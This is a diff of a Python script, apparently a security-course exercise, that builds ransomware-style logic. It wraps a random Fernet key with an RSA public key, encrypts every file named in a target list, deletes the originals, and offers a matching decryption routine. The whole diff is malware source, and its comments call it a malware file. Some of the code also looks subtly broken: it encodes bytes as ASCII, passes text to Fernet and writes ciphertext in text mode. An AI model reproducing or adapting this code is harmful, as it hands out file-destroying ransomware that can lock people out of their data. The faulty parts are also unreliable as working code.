@@ -2,66 +2,83 @@
 import os
 import rsa
 from cryptography.fernet import Fernet
+# from cryptography.hazmat.primitives import serialization
+
+def encrypt(message, key):
+    return rsa.encrypt(message.encode('ascii'), key)
+
+def decrypt(ciphertext, key):
+    try:
+        return rsa.decrypt(ciphertext, key).decode('ascii')
+    except:
+        return False
 
 def BooeyEncryption():
 
     # Given a public key (this can be created outside of the scenario)
-    with open('bababooey.pub', 'rb') as f:
-        publicKey = f.read()
-        
-        # Create a Random Symmetric Key in Memory (smem)
-        smem = Fernet.generate_key()
+    with open('bababooeyPub.pem', 'rb') as f:
+        #print(f)
+        publicKey = rsa.PublicKey.load_pkcs1(f.read())
+        #print(publicKey)
 
-        # Create an encrypted variant of smem on disk (smem-enc)
-        smem_enc = rsa.encrypt(smem, publicKey)
+    # Create a Random Symmetric Key in Memory (smem)
+    smem = Fernet.generate_key()
+    #print(smem)
 
-        with open('smem-enc', 'wb') as f:
-            f.write(smem_enc)
+    # Create an encrypted variant of smem on disk (smem-enc)
+    # smem_enc = rsa.encrypt(smem, publicKey)
+    # smem_encData = serialization.load_pem_public_key(publicKey)
+    # smem_enc = bytes(smem_encData)
+    smem_enc = encrypt(smem, publicKey)
+    #print(smem_enc)
 
-        # Either within your malware file or perhaps a configuration file, read a target list
-        with open('target_list.txt', 'r') as f:
-            targetList = [line.strip() for line in f]
+    with open('smem-enc', 'wb') as f:
+        f.write(smem_enc)
 
-        # For each file in your target list
-        for filePath in targetList:
+    # Either within your malware file or perhaps a configuration file, read a target list
+    with open('target_list.txt', 'r') as f:
+        targetList = [line.strip() for line in f]
 
-            # encrypt the file using smem, giving it a new extension, indicating it has been encrypted
-            if os.path.isfile(filePath):
-                fileDir, fileName = os.path.split(filePath)
-                fileName, fileExt = os.path.splitext(fileName)
-                encryptedFileName = fileName + '_enc' + fileExt
-                encryptedFilePath = os.path.join(fileDir, encryptedFileName)
+    # For each file in your target list
+    for filePath in targetList:
 
-            # Read contents of original file
-            with open(filePath, 'r') as f:
-                    fileData = f.read()
+        # encrypt the file using smem, giving it a new extension, indicating it has been encrypted
+        if os.path.isfile(filePath):
+            fileDir, fileName = os.path.split(filePath)
+            fileName, fileExt = os.path.splitext(fileName)
+            encryptedFileName = fileName + '_enc' + fileExt
+            encryptedFilePath = os.path.join(fileDir, encryptedFileName)
 
-            # Encrypt the file contents
-            f = Fernet(smem)
-            encryptedData = f.encrypt(fileData)
+        # Read contents of original file
+        with open(filePath, 'r') as f:
+                fileData = f.read()
 
-            # Write the encrypted contents to the new file
-            with open(encryptedFilePath, 'w') as f:
-                f.write(encryptedData)
+        # Encrypt the file contents
+        f = Fernet(smem)
+        encryptedData = f.encrypt(fileData)
 
-            # Delete the original file
-            os.remove(filePath)
+        # Write the encrypted contents to the new file
+        with open(encryptedFilePath, 'w') as f:
+            f.write(encryptedData)
 
-        # Clear smem from memory
-        smem = None
+        # Delete the original file
+        os.remove(filePath)
+
+    # Clear smem from memory
+    smem = None
 
 def BooeyDecryption():
 
     # Read the RSA private key from disk
     with open('bababooey.pem', 'rb') as f:
-        privateKey = f.read()
+        privateKey = rsa.PrivateKey.load_pkcs1(f.read())
 
     # Read the encrypted symmetric key from disk
     with open('smem-enc', 'rb') as f:
         smem_enc = f.read()
 
     # Decrypt the symmetric key
-    smem = rsa.decrypt(smem_enc, privateKey)
+    smem = decrypt(smem_enc, privateKey)
 
     # Read the list of encrypted files from a directory
     encryptedFilesDir = input('Path to encrypted files:')
